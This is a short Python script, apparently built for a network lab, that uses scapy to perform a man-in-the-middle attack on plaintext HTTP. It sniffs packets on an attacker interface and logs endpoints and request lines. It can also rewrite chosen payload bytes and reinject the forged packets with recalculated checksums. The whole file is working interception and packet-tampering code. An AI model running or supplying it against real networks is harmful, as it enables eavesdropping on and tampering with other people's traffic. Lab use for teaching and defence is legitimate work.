#!/usr/bin/env python3
"""Sniff HTTP traffic during MITM and optionally reinject modified payload copies."""

from __future__ import annotations

import argparse
from scapy.all import IP, TCP, Raw, send, sniff  # type: ignore


def parse_args() -> argparse.Namespace:
    p = argparse.ArgumentParser(description="Netlab MITM interceptor")
    p.add_argument("--iface", default="veth-atk")
    p.add_argument("--filter", default="tcp port 80")
    p.add_argument("--replace-from", default="")
    p.add_argument("--replace-to", default="")
    p.add_argument("--active-modify", action="store_true")
    return p.parse_args()


def inspect_and_maybe_modify(pkt, replace_from: bytes, replace_to: bytes, active_modify: bool) -> None:
    if not pkt.haslayer(IP) or not pkt.haslayer(TCP):
        return

    ip = pkt[IP]
    tcp = pkt[TCP]
    print(f"[mitm] {ip.src}:{tcp.sport} -> {ip.dst}:{tcp.dport} flags={tcp.flags}")

    if not pkt.haslayer(Raw):
        return

    payload = bytes(pkt[Raw].load)
    if payload.startswith(b"GET ") or payload.startswith(b"POST "):
        first_line = payload.split(b"\r\n", 1)[0]
        print(f"[mitm] HTTP {first_line.decode(errors='replace')}")

    if not active_modify or not replace_from:
        return

    if replace_from not in payload:
        return

    modified = payload.replace(replace_from, replace_to)
    modified_pkt = ip.copy() / tcp.copy() / Raw(load=modified)

    # Force checksum/length recalculation on re-injected packet.
    if hasattr(modified_pkt[IP], "len"):
        del modified_pkt[IP].len
    del modified_pkt[IP].chksum
    del modified_pkt[TCP].chksum

    send(modified_pkt, verbose=False)
    print("[mitm] modified packet copy re-injected")


def main() -> None:
    args = parse_args()
    replace_from = args.replace_from.encode()
    replace_to = args.replace_to.encode()

    print(f"[mitm] sniffing on iface={args.iface} filter='{args.filter}'")
    if args.active_modify:
        print("[mitm] active modification enabled (copy reinjection mode)")

    sniff(
        iface=args.iface,
        filter=args.filter,
        store=False,
        prn=lambda pkt: inspect_and_maybe_modify(pkt, replace_from, replace_to, args.active_modify),
    )


if __name__ == "__main__":
    main()